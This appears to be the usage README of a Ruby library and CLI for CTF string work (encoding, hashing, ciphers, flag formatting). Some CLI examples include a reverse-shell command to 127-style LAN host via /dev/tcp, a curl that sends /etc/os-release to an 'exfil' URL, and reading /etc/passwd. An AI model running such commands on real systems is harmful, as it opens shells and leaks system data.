# Usage

## Library

For base64 encoding instead of writing:

```ruby
require 'base64'

myvar = 'string'
myvar = Base64.strict_encode64(myvar)
```

Just write (shorter and easier to remember):

```ruby
require 'ctf_party'

myvar = 'string'
myvar.to_b64!
```

For base64 verification instead of writing:

```ruby
reg = %r{\A(?:[a-zA-Z0-9+/]{4})*(?:|(?:[a-zA-Z0-9+/]{3}=)|
      (?:[a-zA-Z0-9+/]{2}==)|(?:[a-zA-Z0-9+/]{1}===))\Z}xn
reg.match?('SGVsbG8gd29ybGQh')
```

Just write:

```ruby
'SGVsbG8gd29ybGQh'.b64?
```

For hash/digest instead of writing:

```ruby
Digest::SHA2.new(512).hexdigest('mystr')
```

Just write:

```ruby
'mystr'.sha2_512
```

For rot/rot13/ceasar cipher simply use:

```ruby
'mystr'.rot13
'mystr'.rot(shift: 11)
```

For generating a flag respecting a flag format:

```ruby
String.flag = {prefix: 'sigsegv', digest: 'md5'}
'this_1s_a_fl4g'.flag # => "sigsegv{a5bec9e2a86b6b70d288451eb38dfec8}"
```

See more methods at https://noraj.github.io/ctf-party/yard/

## CLI

Most of the methods are available as commands CLI tool:

```
$ ctf-party 'security' to_hex
7365637572697479

$ ctf-party 'NzQ2Zjc0NmY=' from_b64 hex2bin
01110100011011110111010001101111
```

Use native ruby String methods as well as those from ctf-party:

```
$ ctf-party 'id; /bin/bash -i >& /dev/tcp/192.168.1.14/9999 0>&1' shellescape
id\;\ /bin/bash\ -i\ \>\&\ /dev/tcp/192.168.1.14/9999\ 0\>\&1

$ ctf-party noraj capitalize reverse
jaroN
```

It's possible to read from STDIN:

```
$ curl -s https://example.org | ctf-party - htmlescape
&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Example Domain&lt;/title&gt;
...
```

It's possible to apply the transformation to each row instead of the whole string:

```
$ seq 1 10 | ctf-party - dec2hex hex2bin --row
1
10
11
100
101
110
111
1000
1001
1010

$ curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Malware/conficker.txt | ctf-party - leet md5 --row
dcddb75469b4b4875094e14561e573d8
29c3eea3f305d6b823f562ac4be35217
dd4b21e9ef71e1291183a46b913ae6f2
6fb42da0e32e07b61c9f0251fe627a9c
b0baee9d279d34fa1dfd71aadb908c3f
96e79218965eb72c92a549dd5a330112
7fa8282ad93047a4d6fe6111c93b308a
...

$ cook 'ABC*1-10' | ctf-party - alternatecase succ --row
aBd
aBcAbD
aBcAbCaBd
aBcAbCaBcAbD
aBcAbCaBcAbCaBd
aBcAbCaBcAbCaBcAbD
aBcAbCaBcAbCaBcAbCaBd
aBcAbCaBcAbCaBcAbCaBcAbD
aBcAbCaBcAbCaBcAbCaBcAbCaBd
aBcAbCaBcAbCaBcAbCaBcAbCaBcAbD
```

It's possible to read file directly:

```
$ ctf-party /etc/passwd str2hex --row --file
726f6f743a783a303a303a3a2f726f6f743a2f62696e2f62617368
62696e3a783a313a313a3a2f3a2f7362696e2f6e6f6c6f67696e
6461656d6f6e3a783a323a323a3a2f3a2f7362696e2f6e6f6c6f67696e
6d61696c3a783a383a31323a3a2f7661722f73706f6f6c2f6d61696c3a2f7362696e2f6e6f6c6f67696e
...

$ curl http://example.org/exfil?data=$(ctf-party /etc/os-release urlencode_component --file)
```

## Console

It launches `irb` with the library loaded.

```
$ ctf-party_console
irb(main):001:0>
```
